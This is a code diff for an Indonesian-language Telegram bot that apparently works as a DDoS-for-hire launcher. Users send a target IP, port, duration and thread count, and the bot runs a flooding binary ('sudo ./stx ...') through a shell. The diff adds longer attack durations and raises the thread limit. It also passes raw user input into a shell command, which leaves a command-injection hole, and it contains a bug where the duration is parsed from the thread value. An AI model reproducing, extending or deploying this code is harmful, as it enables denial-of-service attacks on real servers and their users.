@@ -89,7 +89,7 @@ def restart_bot(message):
     if message.from_user.id in ADMINS:
         bot.send_message(message.chat.id, "♻️ 𝗕𝗢𝗧 𝗥𝗘𝗦𝗧𝗔𝗥𝗧...")
         time.sleep(2)
-        subprocess.run("python3 stxddos.py", shell=True)
+        subprocess.run("nohup node /code/index.js", shell=True)
         bot.send_message(message.chat.id, "✅ DDOS READY...")
     else:
         bot.reply_to(message, "🚫 ERROR !")
@@ -290,17 +290,24 @@ def handle_attack(message):
 
     # Parse command arguments
     command_parts = message.text.split()
-    if len(command_parts) != 4:
-        bot.reply_to(message, "✅ Penggunaan: /grx <ip> <port> <thread>\n\nKirim aja anu-nya 🙄\n\nThread-nya segini ya bang 100 - 1000 thread 💥")
+    if len(command_parts) != 5:
+        bot.reply_to(message, "✅ Penggunaan: /grx <ip> <port> <durasi> <thread>\n\nKirim aja anu-nya 🙄\n\nThread-nya segini ya bang 100 - 1000 thread 💥")
         return
 
-    target, port, thread = command_parts[1], command_parts[2], command_parts[3]
+    target, port, durasi, thread = command_parts[1], command_parts[2], command_parts[3], command_parts[4]
 
     try:
-        port = int(port)       
+        port = int(port)
+        
+        durasi = int(thread)
+
+        if durasi > 360:
+            bot.reply_to(message, "❌ Error: To much, 1000 thread max.")
+            return
+        
         thread = int(thread)       
         
-        if thread > 1000:
+        if thread > 2000:
             bot.reply_to(message, "❌ Error: To much, 1000 thread max.")
             return
         
@@ -308,10 +315,10 @@ def handle_attack(message):
         attack_cooldown[user_id] = current_time
 
         # Execute attack (Replace with actual command)
-        attack_command = f"./depstx {target} {port} 120 {thread}"
-        bot.reply_to(message, f"🔥 Kamu mau makai {thread} thread ya? 🤔 pelan-pelan pak sopir, lagi ngirim nganu {thread} ke {target} {port} dalam 69 detik, canda yaa 😂 kirimnya 120 detik aja ya ganteng 🫠")
+        attack_command = f"sudo chmod +x stx && sudo ./stx {target} {port} {durasi} {thread} stx"
+        bot.reply_to(message, f"🔥 Kamu mau makai {thread} thread ya? 🤔 pelan-pelan pak sopir, lagi ngirim nganu {thread} ke {target} {port} dalam 69 detik, canda yaa 😂 kirimnya {durasi} detik aja ya ganteng 🫠")
         subprocess.run(attack_command, shell=True)
-        bot.reply_to(message, f"🔥 Ya nggak tau kok tanya saya ! ! ! \nYanto Kates 🙄!")
+        bot.reply_to(message, f"\n🔥 Ya nggak tau kok tanya saya ! ! ! \nYanto Kates 🙄!")
 
     except ValueError:
         bot.reply_to(message, "❌ Error: Port salah.")
@@ -349,8 +356,10 @@ def handle_bgmi_steps(message):
             markup = InlineKeyboardMarkup()
             markup.row_width = 2
             markup.add(
+                InlineKeyboardButton("60 sec", callback_data="60"),
                 InlineKeyboardButton("180 sec", callback_data="180"),
-                
+                InlineKeyboardButton("240 sec", callback_data="240"),
+                InlineKeyboardButton("360 sec", callback_data="360"),
             )
             bot.reply_to(message, "Choose duration:", reply_markup=markup)
         except ValueError:
@@ -374,7 +383,7 @@ def handle_duration_choice(call):
                 log_command(user_id, state['target'], state['port'], state['time'])
                 ongoing_attacks[user_id] = True
                 start_attack_reply(call.message, state['target'], state['port'], state['time'])
-                full_command = f"./depstx {state['target']} {state['port']} {state['time']} 200"
+                full_command = f"sudo chmod +x stx && sudo ./stx {state['target']} {state['port']} {state['time']} 300 stx"
                 subprocess.run(full_command, shell=True)
                 bot.reply_to(call.message, f"Sutax Attack Finished. Target: {state['target']} Port: {state['port']} Duration: {state['time']} seconds")
                 del ongoing_attacks[user_id]
@@ -651,5 +660,3 @@ if __name__ == "__main__":
             bot.polling(none_stop=True)  # Ensure 'bot' is defined in your context
         except Exception as e:
             print(e)
-
-
